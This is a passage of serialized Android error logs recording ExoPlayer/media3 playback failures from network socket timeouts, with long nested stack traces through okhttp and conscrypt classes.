":""Http1xStream.java"",""lineNumber"":129,""methodName"":""readResponseHeaders""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":750,""methodName"":""readNetworkResponse""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":622,""methodName"":""readResponse""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":475,""methodName"":""execute""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":411,""methodName"":""getResponse""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":542,""methodName"":""getResponseCode""},{""declaringClass"":""com.android.okhttp.internal.huc.DelegatingHttpsURLConnection"",""fileName"":""DelegatingHttpsURLConnection.java"",""lineNumber"":106,""methodName"":""getResponseCode""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpsURLConnectionImpl"",""fileName"":""HttpsURLConnectionImpl.java"",""lineNumber"":30,""methodName"":""getResponseCode""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":366,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""timeout"",""stackTrace"":[{""declaringClass"":""com.android.okhttp.okio.Okio$3"",""fileName"":""Okio.java"",""lineNumber"":214,""methodName"":""newTimeoutException""},{""declaringClass"":""com.android.okhttp.okio.AsyncTimeout"",""fileName"":""AsyncTimeout.java"",""lineNumber"":263,""methodName"":""exit""},{""declaringClass"":""com.android.okhttp.okio.AsyncTimeout$2"",""fileName"":""AsyncTimeout.java"",""lineNumber"":217,""methodName"":""read""},{""declaringClass"":""com.android.okhttp.okio.RealBufferedSource"",""fileName"":""RealBufferedSource.java"",""lineNumber"":307,""methodName"":""indexOf""},{""declaringClass"":""com.android.okhttp.okio.RealBufferedSource"",""fileName"":""RealBufferedSource.java"",""lineNumber"":301,""methodName"":""indexOf""},{""declaringClass"":""com.android.okhttp.okio.RealBufferedSource"",""fileName"":""RealBufferedSource.java"",""lineNumber"":197,""methodName"":""readUtf8LineStrict""},{""declaringClass"":""com.android.okhttp.internal.http.Http1xStream"",""fileName"":""Http1xStream.java"",""lineNumber"":188,""methodName"":""readResponse""},{""declaringClass"":""com.android.okhttp.internal.http.Http1xStream"",""fileName"":""Http1xStream.java"",""lineNumber"":129,""methodName"":""readResponseHeaders""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":750,""methodName"":""readNetworkResponse""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":622,""methodName"":""readResponse""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":475,""methodName"":""execute""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":411,""methodName"":""getResponse""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":542,""methodName"":""getResponseCode""},{""declaringClass"":""com.android.okhttp.internal.huc.DelegatingHttpsURLConnection"",""fileName"":""DelegatingHttpsURLConnection.java"",""lineNumber"":106,""methodName"":""getResponseCode""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpsURLConnectionImpl"",""fileName"":""HttpsURLConnectionImpl.java"",""lineNumber"":30,""methodName"":""getResponseCode""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":366,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""java.net.SocketTimeoutException: timeout"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":370,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":709,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":210,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":299,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}]}
 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":14},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2002,""extras"":{""mMap"":{}},""timestampMs"":2812168263,""cause"":{""dataSpec"":{""absoluteStreamPosition"":16027381,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":16027381,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2002,""cause"":{""bytesTransferred"":0,""cause"":{""detailMessage"":""Socket closed"",""stackTrace"":[{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":188,""methodName"":""read""},{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":143,""methodName"":""read""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":985,""methodName"":""readFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":949,""methodName"":""processDataFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":864,""methodName"":""readUntilDataAvailable""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":837,""methodName"":""read""},{""declaringClass"":""com.android.okhttp.okio.Okio$2"",""fileName"":""Okio.java"",""lineNumber"":138,""methodName"":""read""},{""declaringClass"":""com.android.okhttp.okio.AsyncTimeout$2"",""fileName"":""AsyncTimeout.java"",""lineNumber"":213,""methodName"":""read""},{""declaringClass"":""com.android.okhttp.okio.RealBufferedSource"",""fileName"":""RealBufferedSource.java"",""lineNumber"":307,""methodName"":""indexOf""},{""declaringClass"":""com.android.okhttp.okio.RealBufferedSource"",""fileName"":""RealBufferedSource.java"",""lineNumber"":301,""methodName"":""indexOf""},{""declaringClass"":""com.android.okhttp.okio.RealBufferedSource"",""fileName"":""RealBufferedSource.java"",""lineNumber"":197,""methodName"":""readUtf8LineStrict""},{""declaringClass"":""com.android.okhttp.internal.http.Http1xStream"",""fileName"":""Http1xStream.java"",""lineNumber"":188,""methodName"":""readResponse""},{""declaringClass"":""com.android.okhttp.internal.http.Http1xStream"",""fileName"":""Http1xStream.java"",""lineNumber"":129,""methodName"":""readResponseHeaders""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":750,""methodName"":""readNetworkResponse""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":622,""methodName"":""readResponse""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":475,""methodName"":""execute""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":411,""methodName"":""getResponse""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":542,""methodName"":""getResponseCode""},{""declaringClass"":""com.android.okhttp.internal.huc.DelegatingHttpsURLConnection"",""fileName"":""DelegatingHttpsURLConnection.java"",""lineNumber"":106,""methodName"":""getResponseCode""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpsURLConnectionImpl"",""fileName"":""HttpsURLConnectionImpl.java"",""lineNumber"":30,""methodName"":""getResponseCode""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":366,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""timeout"",""stackTrace"":[{""declaringClass"":""com.android.okhttp.okio.Okio$3"",""fileName"":""Okio.java"",""lineNumber"":214,""methodName"":""newTimeoutException""},{""declaringClass"":""com.android.okhttp.okio.AsyncTimeout"",""fileName"":""AsyncTimeout.java"",""lineNumber"":263,""methodName"":""exit""},{""declaringClass"":""com.android.okhttp.okio.AsyncTimeout$2"",""fileName"":""AsyncTimeout.java"",""lineNumber"":217,""methodName"":""read""},{""declaringClass"":""com.android.okhttp.okio.RealBufferedSource"",""fileName"":""RealBufferedSource.java"",""lineNumber"":307,""methodName"":""indexOf""},{""declaringClass"":""com.android.okhttp.okio.RealBufferedSource"",""fileName"":""RealBufferedSource.java"",""lineNumber"":301,""methodName"":""indexOf""},{""declaringClass"":""com.android.okhttp.okio.RealBufferedSource"",""fileName"":""RealBufferedSource.java"",""lineNumber"":197,""methodName"":""readUtf8LineStrict""},{""declaringClass"":""com.android.okhttp.internal.http.Http1xStream"",""fileName"":""Http1xStream.java"",""lineNumber"":188,""methodName"":""readResponse""},{""declaringClass"":""com.android.okhttp.internal.http.Http1xStream"",""fileName"":""Http1xStream.java"",""lineNumber"":129,""methodName"":""readResponseHeaders""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":750,""methodName"":""readNetworkResponse""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":622,""methodName"":""readResponse""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":475,""methodName"":""execute""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":411,""methodName"":""getResponse""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":542,""methodName"":""getResponseCode""},{""declaringClass"":""com.android.okhttp.internal.huc.DelegatingHttpsURLConnection"",""fileName"":""DelegatingHttpsURLConnection.java"",""lineNumber"":106,""methodName"":""getResponseCode""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpsURLConnectionImpl"",""fileName"":""HttpsURLConnectionImpl.java"",""lineNumber"":30,""methodName"":""getResponseCode""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":366,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""java.net.SocketTimeoutException: timeout"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":370,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":709,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":210,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":299,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}]}"
